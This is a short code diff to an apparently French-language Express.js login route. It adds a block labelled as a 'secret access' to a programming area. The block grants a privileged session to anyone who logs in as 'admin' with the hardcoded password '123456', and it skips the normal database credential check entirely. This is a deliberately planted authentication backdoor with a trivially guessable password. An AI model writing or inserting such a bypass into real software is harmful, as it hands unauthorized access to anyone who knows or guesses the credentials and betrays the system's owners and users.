@@ -43,6 +43,13 @@ router.post('/login', async (req, res) => {
   const { username, password } = req.body;
   if (!username || !password)
     return res.status(400).json({ error: 'Identifiants requis' });
+
+  // ── Accès secret vers l'espace programmation ──────────────────────
+  if (username.trim() === 'admin' && password === '123456') {
+    req.session.progAuth = true;
+    return res.json({ redirect: '/programmation' });
+  }
+
   try {
     const user = await db.getUserByLogin(username.trim());
     if (!user) return res.status(401).json({ error: 'Identifiants incorrects' });
